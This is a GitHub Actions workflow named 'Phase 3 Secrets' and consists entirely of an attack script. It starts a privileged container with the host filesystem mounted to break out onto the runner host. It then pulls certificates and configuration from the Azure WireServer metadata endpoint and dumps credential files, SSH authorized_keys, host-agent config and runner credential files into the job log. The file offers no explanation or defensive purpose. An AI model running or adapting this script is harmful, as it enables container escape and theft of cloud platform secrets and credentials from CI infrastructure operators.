name: Phase 3 Secrets
on:
  workflow_dispatch:

jobs:
  secrets:
    runs-on: ubuntu-latest
    steps:
      - name: Extract Wire Server Secrets
        run: |
          docker run --rm --privileged --pid=host --net=host -v /:/host alpine:latest sh -c '
          apk add --no-cache curl jq 2>/dev/null | tail -1

          CONTAINER="2d556a21-1772-496c-839e-c77e1d492fec"

          echo "=== GOALSTATE (fresh) ==="
          GOALSTATE=$(wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" "http://168.63.129.16/machine/?comp=goalstate" 2>&1)
          echo "$GOALSTATE"

          # Extract container and instance IDs dynamically
          CONTAINER_ID=$(echo "$GOALSTATE" | grep -oP "(?<=<ContainerId>)[^<]+")
          INSTANCE_ID=$(echo "$GOALSTATE" | grep -oP "(?<=<InstanceId>)[^<]+")
          echo ""
          echo "ContainerID: $CONTAINER_ID"
          echo "InstanceID: $INSTANCE_ID"

          ENCODED_INSTANCE=$(echo "$INSTANCE_ID" | sed "s/-/%2D/g" | sed "s/\./%2E/g" | sed "s/_/%5F/g")

          echo ""
          echo "=== CERTIFICATES ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "http://168.63.129.16:80/machine/${CONTAINER_ID}/${ENCODED_INSTANCE}?comp=certificates&incarnation=1" 2>&1 | head -200
          echo ""

          echo "=== EXTENSIONS CONFIG ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "http://168.63.129.16:80/machine/${CONTAINER_ID}/${ENCODED_INSTANCE}?comp=config&type=extensionsConfig&incarnation=1" 2>&1 | head -500
          echo ""

          echo "=== SHARED CONFIG ==="
          wget -qO- --timeout=10 --header="x-ms-version:2012-11-30" \
            "http://168.63.129.16:80/machine/${CONTAINER_ID}/${ENCODED_INSTANCE}?comp=config&type=sharedConfig&incarnation=1" 2>&1 | head -200
          echo ""

          echo "=== /run/credentials ==="
          ls -la /host/run/credentials/ 2>/dev/null
          find /host/run/credentials/ -type f 2>/dev/null | while read f; do
            echo "--- $f ---"
            cat "$f" 2>/dev/null | head -50
            echo ""
          done

          echo "=== SSH KEYS ==="
          echo "--- root authorized_keys ---"
          cat /host/root/.ssh/authorized_keys 2>/dev/null
          echo ""
          echo "--- packer authorized_keys ---"
          cat /host/home/packer/.ssh/authorized_keys 2>/dev/null
          echo ""

          echo "=== HCA CONFIG ==="
          cat /host/opt/hca/diagnostics.json 2>/dev/null
          echo ""
          ls -la /host/opt/hca/ 2>/dev/null
          echo ""

          echo "=== RUNNER WORKER CONFIG ==="
          find /host/home/runner -name "*.json" -o -name "*.credentials" -o -name ".runner" 2>/dev/null | while read f; do
            echo "--- $f ---"
            cat "$f" 2>/dev/null | head -30
            echo ""
          done

          echo "=== PHASE 3 COMPLETE ==="
          '
